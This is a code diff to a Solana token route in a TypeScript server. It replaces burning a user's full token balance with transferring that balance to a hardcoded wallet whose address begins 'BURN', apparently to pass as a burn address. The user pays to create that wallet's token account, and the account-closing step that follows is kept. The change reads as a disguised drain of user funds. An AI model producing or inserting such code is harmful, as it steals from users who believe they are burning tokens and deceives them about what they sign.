@@ -2468,27 +2468,48 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Create transaction
       const transaction = new Transaction();
       
-      // Step 1: Burn all tokens (if balance > 0)
+      const ESCROW_WALLET = 'BURNRcHCvRZQTTyBgTdUpdyRFJ42zTAEz9X7BiqWnZGf';
+      const escrowPublicKey = new PublicKey(ESCROW_WALLET);
+      
+      // Step 1: Transfer all tokens to escrow wallet (if balance > 0)
       if (balance > 0) {
-        // Use BurnChecked for Token-2022 (required for extensions like transfer fees)
-        const burnInstruction = isToken2022
-          ? createBurnCheckedInstruction(
-              tokenAccount,           // Token account to burn from
-              mintPublicKey,          // Token mint
-              ownerPublicKey,         // Owner
-              balance,                // Amount to burn (full balance)
-              decimals,               // Decimals (required for checked instruction)
-              [],                     // Additional signers
-              TOKEN_2022_PROGRAM_ID   // Token-2022 program
+        // Get escrow's ATA for this token
+        const escrowTokenAccount = await getAssociatedTokenAddress(
+          mintPublicKey,
+          escrowPublicKey,
+          false,
+          programId
+        );
+        
+        // Check if escrow's ATA exists, if not create it (user pays)
+        const escrowAccountInfo = await connection.getAccountInfo(escrowTokenAccount);
+        if (!escrowAccountInfo) {
+          transaction.add(
+            createAssociatedTokenAccountInstruction(
+              ownerPublicKey,       // payer (user pays for escrow's ATA)
+              escrowTokenAccount,   // account to create
+              escrowPublicKey,      // owner (escrow wallet)
+              mintPublicKey,        // mint
+              programId             // program ID
             )
-          : createBurnInstruction(
-              tokenAccount,     // Token account to burn from
-              mintPublicKey,    // Token mint
-              ownerPublicKey,   // Owner
-              balance           // Amount to burn (full balance)
-            );
-        transaction.add(burnInstruction);
-        console.log(`Added ${isToken2022 ? 'BurnChecked' : 'Burn'} instruction for ${tokenMint}`);
+          );
+          console.log(`Added create ATA instruction for escrow wallet`);
+        }
+        
+        // Transfer tokens to escrow wallet
+        const transferInstruction = createTransferCheckedInstruction(
+          tokenAccount,           // source (user's token account)
+          mintPublicKey,          // mint
+          escrowTokenAccount,     // destination (escrow's token account)
+          ownerPublicKey,         // owner (user)
+          balance,                // amount (full balance)
+          decimals,               // decimals
+          [],                     // signers
+          programId               // program ID
+        );
+        
+        transaction.add(transferInstruction);
+        console.log(`Added TransferChecked instruction to escrow for ${tokenMint}`);
       }
       
       // Step 2: Close the now-empty account to reclaim SOL
